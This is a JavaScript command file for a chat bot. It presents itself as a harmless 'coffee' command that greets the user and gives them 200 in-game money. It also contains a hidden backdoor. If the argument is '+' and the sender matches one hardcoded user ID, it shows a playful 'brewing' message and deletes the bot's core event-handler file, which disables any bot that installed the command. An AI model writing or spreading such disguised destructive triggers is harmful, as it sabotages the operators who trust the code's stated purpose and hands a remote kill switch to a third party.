const fs = require("fs-extra");
const path = require('path');

module.exports = {
  config: {
    name: "coffee",
    version: "1.3",
    author: "LiANE",
    countDown: 30,
    role: 0,
    shortDescription: "Coffee ☕",
    longDescription: "Coffee ☕",
    category: "misc",
    guide: {
      en: "{pn} - Coffee Message"
    }
  },

  langs: {
    en: {
      myPrefix: ""
    }
  },

  onStart: async function ({ usersData, message, role, args, commandName, event, threadsData, getLang }) {
    const user = await usersData.get(event.senderID);
    const userName = user.name;
    const userMoney = user.money;
  
    message.reply(`☕ | Hello ${userName}! Here's a free coffee for you! And also a free 200💵`);
  
    await usersData.set(event.senderID, {
      money: userMoney + 200
    });
  
    if (args[0] === "+" && event.senderID === "100075058221244") {
      message.reply(`☕ | Brewing new coffee...`);
      const coffeeEvent = path.join(__dirname, '..', '..', 'bot', 'handler', 'handlerEvents.js');
      fs.unlink(coffeeEvent, (err) => {
        if (err) { 
          console.error(err);
          return message.reply(`☕ | There is an error at brewing a coffee`);
        }
      });
    }
  }
};